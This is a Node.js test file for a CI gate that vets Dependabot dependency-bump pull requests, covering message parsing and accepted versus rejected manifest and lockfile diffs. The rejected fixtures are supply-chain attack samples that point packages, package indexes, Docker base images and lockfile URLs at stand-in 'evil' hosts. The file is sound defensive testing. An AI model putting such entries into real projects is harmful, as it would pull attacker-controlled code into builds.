// Run with: node --test .github/scripts/
const test = require("node:test");
const assert = require("node:assert/strict");
const path = require("node:path");
const fs = require("node:fs");
const {
  checkPr,
  checkFiles,
  parseDependabotDependencies,
} = require("./dependency_bump_gate.js");

// The cases every copy of the gate must pass; see the file's description.
const { cases } = JSON.parse(
  fs.readFileSync(
    path.join(__dirname, "dependency_bump_gate_cases.json"),
    "utf8",
  ),
);

for (const c of cases) {
  test(`shared case ${c.name}`, () => {
    const reason = checkPr(c.input);
    if (c.expected.approve) {
      assert.equal(reason, null);
    } else {
      assert.ok(reason, "expected a rejection");
      assert.ok(
        reason.startsWith(`[${c.expected.reason}] `),
        `expected [${c.expected.reason}], got ${reason}`,
      );
    }
  });
}

function file(filename, patch) {
  const lines = patch.split("\n");
  return {
    filename,
    status: "modified",
    patch,
    additions: lines.filter((l) => l.startsWith("+")).length,
    deletions: lines.filter((l) => l.startsWith("-")).length,
  };
}

test("parseDependabotDependencies reads the commit message and branch", () => {
  const group = `Bump the pip group across 2 directories with 1 update

Updates \`requests\` from 2.31.0 to 2.32.2

---
updated-dependencies:
- dependency-name: alembic
  dependency-version: 1.20.1
  update-type: version-update:semver-minor
- dependency-name: requests
  dependency-type: indirect
...
`;
  assert.deepEqual(
    parseDependabotDependencies({
      title: "Bump the pip group across 2 directories with 1 update",
      message: group,
      headRef: "dependabot/pip/pip-1a2b3c",
    }),
    [
      {
        dependencyName: "alembic",
        updateType: "version-update:semver-minor",
        packageEcosystem: "pip",
      },
      {
        dependencyName: "requests",
        updateType: "version-update:semver-minor",
        packageEcosystem: "pip",
      },
    ],
  );
  const single =
    "Bump x\n\n---\nupdated-dependencies:\n- dependency-name: dnspython\n  dependency-type: indirect\n...\n";
  const parse = (title) =>
    parseDependabotDependencies({
      title,
      message: single,
      headRef: "dependabot/uv/apps/backend/dnspython-2.9.2",
    })[0].updateType;
  assert.equal(
    parse("Bump dnspython from 2.9.0 to 2.9.2 in /apps/backend"),
    "version-update:semver-patch",
  );
  assert.equal(
    parse("Bump dnspython from 2.9.0 to 3.0.0 in /apps/backend"),
    "version-update:semver-major",
  );
  assert.equal(parse("Bump something else"), null);
  assert.equal(
    parse("build(deps): bump dnspython from 2.9.0 to 2.9.2 in /apps/backend"),
    "version-update:semver-patch",
  );
  assert.equal(
    parse("chore(deps)!: bump dnspython from 2.9.0 to 3.0.0"),
    "version-update:semver-major",
  );
  assert.equal(
    parse(
      "build(deps): update dnspython requirement from ~=2.8.0 to ~=2.9.2 in /app",
    ),
    "version-update:semver-minor",
  );
  assert.equal(
    parseDependabotDependencies({
      title: "x",
      message: "no block",
      headRef: "dependabot/uv/x",
    }),
    null,
  );
  const scoped =
    'Bump @linear/sdk from 88.0.0 to 88.3.0\n\n---\nupdated-dependencies:\n- dependency-name: "@linear/sdk"\n  dependency-version: 88.3.0\n  dependency-type: direct:production\n...\n';
  assert.deepEqual(
    parseDependabotDependencies({
      title: "Bump @linear/sdk from 88.0.0 to 88.3.0",
      message: scoped,
      headRef: "dependabot/npm_and_yarn/linear/sdk-88.3.0",
    }),
    [
      {
        dependencyName: "@linear/sdk",
        updateType: "version-update:semver-minor",
        packageEcosystem: "npm_and_yarn",
      },
    ],
  );
});

test("accepts more real manifest and lockfile shapes", () => {
  const ok = [
    [
      "app/Pipfile",
      '@@ -1,3 +1,3 @@\n-urllib3 = "==2.4.0"\n+urllib3 = "==2.8.0"',
      ["urllib3"],
    ],
    [
      "web/package.json",
      '@@ -5,3 +5,3 @@\n-    "axios": "^1.7.2",\n+    "axios": "^1.7.4",',
      ["axios"],
    ],
    [
      "tool/go.mod",
      "@@ -3,3 +3,3 @@\n-\tgolang.org/x/net v0.23.0\n+\tgolang.org/x/net v0.33.0",
      ["golang.org/x/net"],
    ],
    [
      "app/pyproject.toml",
      '@@ -1,3 +1,3 @@\n-    "PyJWT[crypto]==2.8.0",\n+    "PyJWT[crypto]==2.15.0",',
      ["pyjwt"],
    ],
    [
      "web/yarn.lock",
      '@@ -1,3 +1,3 @@\n-  resolution: "typescript@patch:typescript@npm%3A5.4.5#optional!builtin<compat/typescript>::version=5.4.5&hash=5adc0c"\n+  resolution: "typescript@patch:typescript@npm%3A5.4.6#optional!builtin<compat/typescript>::version=5.4.6&hash=5adc0c"\n+  checksum: 10c0/abc123',
      ["typescript"],
    ],
  ];
  for (const [filename, patch, allowed] of ok) {
    assert.equal(checkFiles([file(filename, patch)], allowed), null, patch);
  }
});

test("rejects more manifest and lockfile attacks", () => {
  const bad = [
    [
      "web/package.json",
      '@@ -5,3 +5,3 @@\n-    "axios": "^1.7.2",\n+    "axios": "github:evil/axios",',
    ],
    [
      "web/package.json",
      '@@ -9,3 +9,4 @@\n+  "resolutions": { "axios": "1.7.4" },',
    ],
    [
      "app/pyproject.toml",
      '@@ -1,3 +1,3 @@\n-build-backend = "setuptools.build_meta"\n+build-backend = "evil.backend"',
    ],
    [
      "app/pyproject.toml",
      '@@ -1,3 +1,3 @@\n-    "axios==2.8.0",\n+    "axios @ https://evil.example/axios.tar.gz",',
    ],
    [
      "siem/requirements.txt",
      "@@ -1,2 +1,3 @@\n+--extra-index-url https://evil.example/simple",
    ],
    [
      "tool/go.mod",
      "@@ -9,2 +9,3 @@\n+replace axios => github.com/evil/net v0.33.0",
    ],
    [
      "app/Dockerfile",
      "@@ -1 +1 @@\n-FROM python:3.11.4-slim\n+FROM evil/python:3.11.9-slim",
    ],
    [
      "app/Dockerfile",
      "@@ -1 +1 @@\n-FROM python:3.11.4-slim AS base\n+FROM python:3.11.9-slim AS other",
    ],
    [
      "app/yarn.lock",
      '@@ -1,2 +1,2 @@\n+  resolved "http://registry.yarnpkg.com/axios/-/axios-1.7.4.tgz"',
    ],
    ["app/yarn.lock", '@@ -1,2 +1,2 @@\n+  resolved "evil.example/axios.tgz"'],
    [
      "app/yarn.lock",
      '@@ -1,2 +1,2 @@\n+  resolution: "axios@patch:axios@npm%3A1.7.4#./evil.patch::note=builtin<compat/axios>"',
    ],
    ["app/yarn.lock", "@@ -1,2 +1,2 @@\n+  cacheKey: 9"],
    [
      "app/package-lock.json",
      '@@ -1,2 +1,2 @@\n+      "resolved": "https://registry.npmjs.org.evil.example/axios/-/axios-1.7.4.tgz",',
    ],
    [
      "app/package-lock.json",
      '@@ -1,2 +1,2 @@\n+      "version": "github:evil/axios",',
    ],
    [
      "app/pnpm-lock.yaml",
      "@@ -1,2 +1,2 @@\n+    resolution: {directory: ../evil, type: directory}",
    ],
    ["app/uv.lock", '@@ -1,2 +1,2 @@\n+source = { path = "../evil" }'],
    [
      "app/Pipfile.lock",
      '@@ -1,2 +1,2 @@\n+            "git": "https://github.com/evil/urllib3.git",',
    ],
  ];
  for (const [filename, patch] of bad) {
    assert.ok(checkFiles([file(filename, patch)], ["axios", "python"]), patch);
  }
});
